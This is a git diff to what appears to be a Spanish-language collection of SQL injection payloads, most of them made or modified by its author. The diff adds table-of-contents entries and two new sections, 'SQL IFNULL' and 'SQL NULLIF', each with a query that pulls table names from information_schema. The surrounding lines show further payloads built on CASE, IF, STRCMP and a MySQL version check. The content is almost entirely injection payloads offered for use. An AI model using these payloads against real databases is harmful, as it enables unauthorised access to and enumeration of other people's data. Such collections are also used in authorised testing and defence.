@@ -51,6 +51,8 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
         * [Sql inyection usando elt, doble Reverse, hex y unhex](#Sql-inyection-usando-elt,-doble-Reverse,-hex-y-unhex)
         * [Sql inyection case](#Sql-inyection-case)
         * [SQL IF Function](#SQL-IF-Function)
+        * [SQL IFNULL](#SQL-IFNULL)
+        * [SQL NULLIF](#SQL-NULLIF)
         * [Sql inyection payload usando upper + reverse + right + sounds like](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like)
         * [SQL injection usando doble reverse + right + if statement + HTML injection](#SQL-injection-usando-doble-reverse-+-right-+-if-statement-+-HTML-injection)
         * [Sql inyection usando las funciones HEX-UNHEX](#Sql-inyection-usando-las-funciones-HEX-UNHEX)
@@ -927,6 +929,18 @@ SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.
 SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables
 
 select IF(MID(@@version,1,1)='5',table_name,'_Y000!_') from information_schema.tables
+```
+
+### SQL IFNULL
+
+```
+SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables
+```
+
+### SQL NULLIF
+
+```
+SELECT NULLIF(table_name,2) from information_schema.tables
 ```
 
 ### Sql inyection payload usando upper + reverse + right + sounds like
